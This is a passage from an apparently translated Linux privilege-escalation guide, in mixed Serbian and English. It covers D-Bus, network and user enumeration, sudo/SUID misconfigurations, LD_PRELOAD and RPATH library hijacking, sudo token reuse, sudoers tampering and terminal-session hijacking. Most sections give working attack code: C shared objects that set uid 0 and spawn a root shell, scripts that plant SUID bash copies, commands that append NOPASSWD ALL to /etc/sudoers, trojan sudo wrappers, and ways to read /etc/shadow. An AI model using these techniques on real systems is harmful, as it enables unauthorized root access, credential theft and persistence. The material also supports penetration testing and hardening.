Sistem je svestran, podržavajući osnovni IPC koji poboljšava razmenu podataka između procesa, podsećajući na **enhanced UNIX domain sockets**. Pored toga, pomaže u emitovanju događaja ili signala, podstičući besprekornu integraciju među komponentama sistema. Na primer, signal od Bluetooth daemona o dolaznom pozivu može naterati muzički plejer da utiša zvuk, poboljšavajući korisničko iskustvo. Dodatno, D-Bus podržava sistem udaljenih objekata, pojednostavljujući zahteve za servis i pozive metoda između aplikacija, racionalizujući procese koji su nekada bili složeni.

D-Bus radi po modelu **allow/deny**, upravljajući dozvolama za poruke (pozivi metoda, emitovanje signala, itd.) na osnovu kumulativnog efekta poklapanja pravila politike. Te politike specificiraju interakcije sa bus-om, potencijalno dozvoljavajući eskalaciju privilegija kroz zloupotrebu tih dozvola.

Dat je primer takve politike u `/etc/dbus-1/system.d/wpa_supplicant.conf`, koji detaljno opisuje dozvole za root korisnika da poseduje, šalje i prima poruke od `fi.w1.wpa_supplicant1`.

Politike bez specificiranog korisnika ili grupe primenjuju se univerzalno, dok se politike u kontekstu "default" primenjuju na sve koji nisu obuhvaćeni drugim specifičnim politikama.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Naučite kako da enumerate i exploit D-Bus komunikaciju ovde:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mreža**

Uvek je interesantno da enumerate mrežu i utvrdite poziciju mašine.

### Generička enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Otvoreni portovi

Uvek proverite network services koji rade na mašini, a sa kojima niste mogli da interagujete pre nego što ste joj pristupili:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Proverite da li možete da sniff traffic. Ako možete, mogli biste da uhvatite neke credentials.
```
timeout 1 tcpdump
```
## Korisnici

### Generička enumeracija

Proveri **ko** si, koje **privilegije** imaš, koji **korisnici** postoje u sistemima, koji od njih mogu da se **prijave** i koji imaju **root privilegije:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Veliki UID

Neke Linux verzije su bile pogođene ranjivošću koja omogućava korisnicima sa **UID > INT_MAX** da eskaliraju privilegije. Više informacija: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Grupe

Proveri da li si **član neke grupe** koja bi ti mogla dodeliti root privilegije:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Međuspremnik

Proveri da li se nešto zanimljivo nalazi u međuspremniku (ako je moguće)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politika lozinki
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Poznate lozinke

Ako **poznajete bilo koju lozinku** okruženja **pokušajte da se prijavite kao svaki korisnik** koristeći tu lozinku.

### Su Brute

Ako vam ne smeta da pravite dosta buke i ako su na računaru prisutni binarni fajlovi `su` i `timeout`, možete pokušati da brute-force-ujete korisnika koristeći [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sa `-a` parametrom takođe pokušava da brute-force-uje korisnike.

## Iskorišćavanje upisivih lokacija u $PATH

### $PATH

Ako otkrijete da možete **pisati u neki folder iz $PATH** možda ćete moći da povisite privilegije tako što ćete **napraviti backdoor unutar upisivog foldera** sa imenom neke komande koja će biti izvršena od strane drugog korisnika (idealno root) i koja **se ne učitava iz foldera koji se nalaze pre** vašeg upisivog foldera u $PATH.

### SUDO and SUID

Možda vam je dozvoljeno da izvršite neku komandu koristeći sudo ili komanda može imati suid bit. Proverite to koristeći:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Neke **neočekivane commands omogućavaju vam da pročitate i/ili upišete fajlove ili čak execute a command.** Na primer:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo konfiguracija može omogućiti korisniku da izvrši neku komandu sa privilegijama drugog korisnika bez poznavanja lozinke.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
U ovom primeru korisnik `demo` može da pokrene `vim` kao `root`; sada je trivijalno dobiti shell dodavanjem ssh key u `root` direktorijum ili pozivom `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ova direktiva omogućava korisniku da **set an environment variable** prilikom izvršavanja nečega:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ovaj primer, **zasnovan na HTB machine Admirer**, bio je **ranjiv** na **PYTHONPATH hijacking** koji je omogućavao učitavanje proizvoljne python biblioteke prilikom izvršavanja skripte kao root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- Zašto funkcioniše: Za neinteraktivne shell-ove, Bash procenjuje `$BASH_ENV` i učitava taj fajl pre pokretanja ciljnog skripta. Mnogi sudo pravilnici dozvoljavaju pokretanje skripte ili shell wrapper-a. Ako `BASH_ENV` ostane sačuvan od strane sudo, vaš fajl će biti učitan sa root privilegijama.

- Zahtevi:
- Pravilo u sudo koje možete pokrenuti (bilo koji target koji poziva `/bin/bash` neinteraktivno, ili bilo koji bash script).
- `BASH_ENV` prisutan u `env_keep` (proverite sa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Uklonite `BASH_ENV` (i `ENV`) iz `env_keep`, preferirajte `env_reset`.
- Izbegavajte shell omotače za komande dozvoljene preko sudo; koristite minimalne binarne fajlove.
- Razmotrite sudo I/O logovanje i obaveštavanje kada se koriste sačuvane promenljive okruženja.

### Terraform preko sudo sa sačuvanim HOME (!env_reset)

Ako sudo ostavi okruženje netaknuto (`!env_reset`) dok dozvoljava `terraform apply`, `$HOME` ostaje korisnika koji je pozvao komandu. Terraform zato učitava **$HOME/.terraformrc** kao root i poštuje `provider_installation.dev_overrides`.

- Usmerite traženi provider na direktorijum sa pravom pisanja i ubacite maliciozni plugin nazvan po provideru (npr., `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform neće uspeti u Go plugin handshake, ali pre nego što se ugasi izvrši payload kao root i ostavi SUID shell iza sebe.

### TF_VAR overrides + symlink validation bypass

Terraform promenljive se mogu proslediti putem `TF_VAR_<name>` environment variables, koje opstaju kada sudo zadrži okruženje. Slabe validacije kao što su `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` mogu se zaobići pomoću symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform rešava symlink i kopira stvarni `/root/root.txt` u destinaciju čitljivu napadaču. Isti pristup može se koristiti za **pisanje** u privilegovane putanje prethodnim kreiranjem odredišnih symlinkova (npr. upućivanjem provider-ove destinacione putanje unutar `/etc/cron.d/`).

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Ako `sudo -l` pokazuje `env_keep+=PATH` ili `secure_path` koji sadrži unose u koje napadač može pisati (npr. `/home/<user>/bin`), bilo koja relativna komanda unutar sudo-dozvoljenog cilja može biti zasjenjena.

- Zahtevi: sudo pravilo (često `NOPASSWD`) koje pokreće skriptu/binar koji poziva komande bez apsolutnih putanja (`free`, `df`, `ps`, itd.) i direktorijum u PATH-u u koji je moguće pisati koji se pretražuje prvi.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo: zaobilaženje putanja izvršavanja
**Skoči** da pročitaš druge datoteke ili koristi **symlinks**. Na primer u sudoers fajlu: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ako se koristi **wildcard** (\*), još je lakše:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Protivmere**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

If the **sudo permission** is given to a single command **without specifying the path**: _hacker10 ALL= (root) less_ možete to iskoristiti promenom promenljive PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ova tehnika se može takođe koristiti ako **suid** binary **izvršava drugu komandu bez navođenja putanje do nje (** **uvek proverite pomoću** _**strings**_ **sadržaj čudnog SUID binarnog fajla**)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary sa putanjom komande

Ako **suid** binary **izvršava drugu komandu navodeći putanju**, onda možete pokušati da **export a function** sa imenom komande koju suid fajl poziva.

Na primer, ako suid binary poziva _**/usr/sbin/service apache2 start**_ morate pokušati da kreirate funkciju i export it:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Zatim, kada pozovete suid binary, ova funkcija će se izvršiti

### LD_PRELOAD & **LD_LIBRARY_PATH**

Promenljiva okruženja **LD_PRELOAD** koristi se za navođenje jedne ili više deljenih biblioteka (.so fajlova) koje loader učitava pre svih ostalih, uključujući standardnu C biblioteku (`libc.so`). Ovaj proces je poznat kao preloading a library.

Međutim, da bi se održala bezbednost sistema i sprečilo zloupotrebljavanje ove funkcije, naročito kod **suid/sgid** izvršnih fajlova, sistem primenjuje određene uslove:

- Loader ignoriše **LD_PRELOAD** za izvršne fajlove gde real user ID (_ruid_) nije isti kao effective user ID (_euid_).
- Za suid/sgid izvršne fajlove, pre učitavaju se samo biblioteke koje se nalaze u standardnim putanjama i koje su takođe suid/sgid.

Privilege escalation može da se desi ako imate mogućnost izvršavanja komandi sa `sudo` i izlaz `sudo -l` sadrži izjavu **env_keep+=LD_PRELOAD**. Ova konfiguracija dozvoljava da promenljiva okruženja **LD_PRELOAD** ostane i bude prepoznata čak i kada se komande pokreću sa `sudo`, što može dovesti do izvršavanja arbitrary code sa povišenim privilegijama.
```
Defaults        env_keep += LD_PRELOAD
```
Sačuvaj kao **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Zatim **kompajlirajte ga** koristeći:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na kraju, **escalate privileges** pokretanjem
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Sličan privesc može biti zloupotrebljen ako napadač kontroliše **LD_LIBRARY_PATH** env variable, jer tada kontroliše putanju u kojoj će se tražiti biblioteke.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID binarna datoteka – .so injection

Kada naiđete na binarnu datoteku sa **SUID** permisijama koja deluje neobično, dobro je proveriti da li ispravno učitava **.so** fajlove. To se može proveriti pokretanjem sledeće komande:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na primer, greška kao _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ ukazuje na mogućnost eksploatacije.

Da bi se ovo iskoristilo, treba napraviti C fajl, na primer _"/path/to/.config/libcalc.c"_, koji sadrži sledeći kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ovaj kod, kada se kompajlira i izvrši, ima za cilj da povisi privilegije manipulisanjem dozvolama fajlova i izvršavanjem shell-a sa povišenim privilegijama.

Kompajlirajte gore navedeni C fajl u shared object (.so) fajl koristeći:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Na kraju, pokretanje pogođenog SUID binarnog fajla trebalo bi da pokrene exploit, što omogućava potencijalno kompromitovanje sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sada kada smo pronašli SUID binary koji učitava biblioteku iz direktorijuma u koji možemo pisati, napravimo biblioteku u tom direktorijumu sa potrebnim imenom:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ako dobijete grešku kao što je
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to znači da biblioteka koju ste generisali treba da sadrži funkciju nazvanu `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) je kurirana lista Unix binarnih fajlova koje napadač može iskoristiti da zaobiđe lokalna bezbednosna ograničenja. [**GTFOArgs**](https://gtfoargs.github.io/) je isto, ali za slučajeve kada možete **samo ubacivati argumente** u komandu.

Projekat prikuplja legitimne funkcionalnosti Unix binarnih fajlova koje se mogu zloupotrebiti da se izađe iz ograničenih shell-ova, eskaliraju ili održe povišene privilegije, prenesu fajlovi, spawn-uju bind i reverse shells, i olakšaju drugi post-exploitation zadaci.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ako možete da pokrenete `sudo -l` možete koristiti alat [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) da proverite da li pronalazi način kako da iskoristi bilo koje sudo pravilo.

### Reusing Sudo Tokens

U slučajevima kada imate **sudo pristup** ali ne i lozinku, možete eskalirati privilegije tako što ćete **sačekati izvršenje sudo komande i potom preuzeti token sesije**.

Zahtevi za eskalaciju privilegija:

- Već imate shell kao korisnik "_sampleuser_"
- "_sampleuser_" je **koristio `sudo`** da izvrši nešto u **poslednjih 15 minuta** (po defaultu to je trajanje sudo tokena koji nam omogućava da koristimo `sudo` bez unošenja lozinke)
- `cat /proc/sys/kernel/yama/ptrace_scope` je 0
- `gdb` je dostupan (možete ga otpremiti)

(Privremeno možete omogućiti `ptrace_scope` sa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ili trajno menjajući `/etc/sysctl.d/10-ptrace.conf` i postavljanjem `kernel.yama.ptrace_scope = 0`)

Ako su svi ovi zahtevi ispunjeni, **možete eskalirati privilegije koristeći:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Prvi exploit (`exploit.sh`) će kreirati binarni fajl `activate_sudo_token` u _/tmp_. Možete ga koristiti da **aktivirate sudo token u svojoj sesiji** (nećete automatski dobiti root shell, pokrenite `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Drugi **exploit** (`exploit_v2.sh`) će kreirati sh shell u _/tmp_ **koji je u vlasništvu root-a i ima setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Treći exploit** (`exploit_v3.sh`) će **kreirati sudoers file** koji čini **sudo tokens večnim i omogućava svim korisnicima da koriste sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ako imate **dozvole za pisanje** u direktorijumu ili na bilo kojem od fajlova koji su kreirani unutar tog direktorijuma, možete koristiti binarni fajl [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) da **kreirate sudo token za korisnika i PID**.\
Na primer, ako možete prepisati fajl _/var/run/sudo/ts/sampleuser_ i imate shell kao taj korisnik sa PID 1234, možete **dobiti sudo privilegije** bez potrebe da znate lozinku izvršavajući:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Fajl `/etc/sudoers` i fajlovi unutar `/etc/sudoers.d` konfigurišu ko može da koristi `sudo` i kako. Ovi fajlovi **podrazumevano mogu biti čitani samo od strane korisnika root i grupe root**.\
**Ako** možete da **pročitate** ovaj fajl, mogli biste da **dobijete neke interesantne informacije**, a ako možete da **pišete** u bilo koji fajl, bićete u mogućnosti da **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ako imate pravo pisanja, možete zloupotrebiti ovu dozvolu.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Još jedan način zloupotrebe ovih ovlašćenja:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Postoje neke alternative binarnoj datoteci `sudo`, kao što je `doas` za OpenBSD; obavezno proverite njegovu konfiguraciju u `/etc/doas.conf`.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ako znate da **user usually connects to a machine and uses `sudo`** za eskalaciju privilegija i dobijete shell u tom korisničkom kontekstu, možete **kreirati novi sudo izvršni fajl** koji će izvršiti vaš kod kao root, a zatim korisničku komandu. Zatim, **modify the $PATH** korisničkog konteksta (na primer dodavanjem novog puta u .bash_profile) tako da kada korisnik pokrene sudo, izvrši se vaš sudo izvršni fajl.

Obratite pažnju da ako korisnik koristi drugi shell (ne bash) moraćete da izmenite druge fajlove da dodate novu putanju. Na primer[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Možete naći još jedan primer u [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ili pokretanjem nečeg poput:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Datoteka `/etc/ld.so.conf` pokazuje **odakle potiču učitane konfiguracione datoteke**. Obično ova datoteka sadrži sledeći put: `include /etc/ld.so.conf.d/*.conf`

To znači da će biti pročitane konfiguracione datoteke iz `/etc/ld.so.conf.d/*.conf`. Te konfiguracione datoteke **pokazuju na druge foldere** u kojima će se tražiti **biblioteke**. Na primer, sadržaj `/etc/ld.so.conf.d/libc.conf` je `/usr/local/lib`. **To znači da će sistem tražiti biblioteke unutar `/usr/local/lib`**.

Ako iz nekog razloga **korisnik ima prava za pisanje** na bilo kom od navedenih puteva: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bilo kojoj datoteci unutar `/etc/ld.so.conf.d/` ili bilo kom folderu na koji pokazuje konfiguraciona datoteka iz `/etc/ld.so.conf.d/*.conf` može biti u mogućnosti da eskalira privilegije.\
Pogledajte **kako iskoristiti ovu pogrešnu konfiguraciju** na sledećoj stranici:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiranjem lib u `/var/tmp/flag15/`, program će ga koristiti na ovom mestu, kako je navedeno u `RPATH` varijabli.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Zatim kreirajte zlonamernu biblioteku u `/var/tmp` pomoću `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities provide a **subset of the available root privileges to a process**. This effectively breaks up root **privileges into smaller and distinctive units**. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

In a directory, the **bit for "execute"** implies that the user affected can "**cd**" into the folder.\
The **"read"** bit implies the user can **list** the **files**, and the **"write"** bit implies the user can **delete** and **create** new **files**.

## ACLs

Access Control Lists (ACLs) represent the secondary layer of discretionary permissions, capable of **overriding the traditional ugo/rwx permissions**. These permissions enhance control over file or directory access by allowing or denying rights to specific users who are not the owners or part of the group. This level of **granularity ensures more precise access management**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dodeli** korisniku "kali" read i write permisije nad fajlom:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Dohvati** fajlove iz sistema koji imaju određene ACLs:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otvorene shell sessions

U **starijim verzijama** možete **hijack** neku **shell** sesiju drugog korisnika (**root**).\
U **najnovijim verzijama** moći ćete **connect** samo na screen sessions svog **svojeg korisnika**. Međutim, možete pronaći **zanimljive informacije unutar sesije**.

### screen sessions hijacking

**Prikaži screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Prikači se na sesiju**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## otimanje tmux sesija

Ovo je bio problem sa **starim verzijama tmux-a**. Nisam mogao, kao neprivilegovan korisnik, da otmem tmux (v2.1) sesiju koju je kreirao root.

**Prikaži tmux sesije**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Priključite se na session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Pogledaj **Valentine box from HTB** za primer.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Svi SSL i SSH ključevi generisani na sistemima baziranim na Debianu (Ubuntu, Kubuntu, itd.) između septembra 2006. i 13. maja 2008. mogu biti pogođeni ovim bagom.\
Ovaj bag nastaje prilikom kreiranja novog ssh ključa na tim OS-ovima, jer je bilo moguće **samo 32,768 varijacija**. To znači da se sve mogućnosti mogu proračunati i da, **posedujući ssh public key, možete potražiti odgovarajući private key**. Možete naći izračunate mogućnosti ovde: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Zanimljive vrednosti konfiguracije

- **PasswordAuthentication:** Određuje da li je autentifikacija lozinkom dozvoljena. Podrazumevano je `no`.
- **PubkeyAuthentication:** Određuje da li je autentifikacija pomoću public key dozvoljena. Podrazumevano je `yes`.
- **PermitEmptyPasswords**: Kada je autentifikacija lozinkom dozvoljena, određuje da li server dozvoljava prijavu na naloge sa praznim lozinkama. Podrazumevano je `no`.

### PermitRootLogin

Određuje da li root može da se prijavi koristeći ssh, podrazumevano je `no`. Moguće vrednosti:

- `yes`: root može da se prijavi koristeći password i private key
- `without-password` or `prohibit-password`: root se može prijaviti samo pomoću private key
- `forced-commands-only`: root se može prijaviti samo pomoću private key i samo ako su specificirane opcije za commands
- `no` : ne

### AuthorizedKeysFile

Određuje fajlove koji sadrže public keys koji se mogu koristiti za autentifikaciju korisnika. Može sadržati tokene kao što je `%h`, koji će biti zamenjeni home direktorijumom. **Možete navesti apsolutne putanje** (koje počinju sa `/`) ili **relativne putanje u odnosu na korisnički home**. Na primer:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracija označava da, ako pokušate da se prijavite koristeći **private** key korisnika "**testusername**", ssh će uporediti public key vašeg key-a sa onima koji se nalaze u `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding vam omogućava da **use your local SSH keys instead of leaving keys** (without passphrases!) koji bi inače ostali na vašem serveru. Dakle, moći ćete da **jump** via ssh **to a host** i odatle **jump to another** host **using** the **key** located in your **initial host**.

Ovu opciju treba podesiti u `$HOME/.ssh.config` na sledeći način:
```
Host example.com
ForwardAgent yes
```
Obratite pažnju da ako je `Host` `*`, svaki put kada se korisnik prebaci na drugu mašinu, ta mašina će moći da pristupi ključevima (što predstavlja bezbednosni problem).

Fajl `/etc/ssh_config` može **poništiti** ove **opcije** i dozvoliti ili zabraniti ovu konfiguraciju.\
Fajl `/etc/sshd_config` može **dozvoliti** ili **zabraniti** ssh-agent forwarding pomoću ključne reči `AllowAgentForwarding` (podrazumevano je dozvoljeno).

Ako otkrijete da je Forward Agent konfigurisan u okruženju pročitajte sledeću stranicu jer **možda ćete moći da ga zloupotrebite za eskalaciju privilegija**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Zanimljivi fajlovi

### Datoteke profila

Fajl `/etc/profile` i fajlovi u direktorijumu `/etc/profile.d/` su **skripte koje se izvršavaju kada korisnik pokrene novu shell**. Dakle, ako možete **da napišete ili izmenite bilo koji od njih, možete eskalirati privilegije**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ako se pronađe neka čudna skripta profila, trebalo bi je proveriti zbog **osetljivih detalja**.

### Passwd/Shadow fajlovi

